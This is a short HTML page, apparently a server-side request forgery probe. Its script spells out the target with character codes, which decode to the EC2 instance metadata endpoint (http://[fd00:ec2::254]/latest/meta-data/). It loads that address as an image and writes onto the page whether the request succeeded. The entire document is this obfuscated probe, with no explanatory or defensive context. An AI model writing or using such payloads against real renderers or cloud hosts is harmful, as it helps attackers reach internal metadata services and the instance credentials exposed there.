<!DOCTYPE html>
<html><body>
<h1>IMG_SRC_TEST</h1>
<div id="r1">LOADING</div>
<script>
var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
var proto = String.fromCharCode(104,116,116,112);
var img = new Image();
img.onload = function() { document.getElementById('r1').innerText = 'IMG_LOADED:' + img.width + 'x' + img.height; };
img.onerror = function() { document.getElementById('r1').innerText = 'IMG_ERROR'; };
img.src = proto + '://[' + ip + ']/latest/meta-data/';
</script>
</body></html>
